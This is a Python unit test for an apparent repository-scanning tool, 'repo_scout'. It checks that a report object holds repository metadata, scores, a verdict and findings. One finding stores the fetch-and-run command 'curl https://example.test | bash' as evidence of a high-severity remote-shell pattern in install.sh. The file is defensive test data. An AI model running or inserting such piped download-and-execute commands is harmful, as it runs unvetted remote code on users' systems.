import unittest

from repo_scout.models import Finding, RepoReport, RepoSignals, RepoSummary, ScoreResult


class ModelTests(unittest.TestCase):
    def test_report_carries_scores_and_findings(self):
        repo = RepoSummary(
            full_name="owner/repo",
            description="AI automation",
            url="https://github.com/owner/repo",
            stars=100,
            forks=10,
            open_issues=2,
            pushed_at="2026-07-01T00:00:00Z",
        )
        signals = RepoSignals(
            has_readme="present",
            has_license="present",
            has_tests="present",
            has_ci="present",
        )
        finding = Finding(
            severity="high",
            rule="remote-shell",
            path="install.sh",
            message="Remote shell execution pattern",
            evidence="curl https://example.test | bash",
        )
        score = ScoreResult(usefulness=80, risk=60, verdict="INSPECT FIRST", reasons=["clear README"])

        report = RepoReport(repo=repo, signals=signals, findings=[finding], score=score)

        self.assertEqual(report.repo.full_name, "owner/repo")
        self.assertEqual(report.score.verdict, "INSPECT FIRST")
        self.assertEqual(report.findings[0].severity, "high")


if __name__ == "__main__":
    unittest.main()
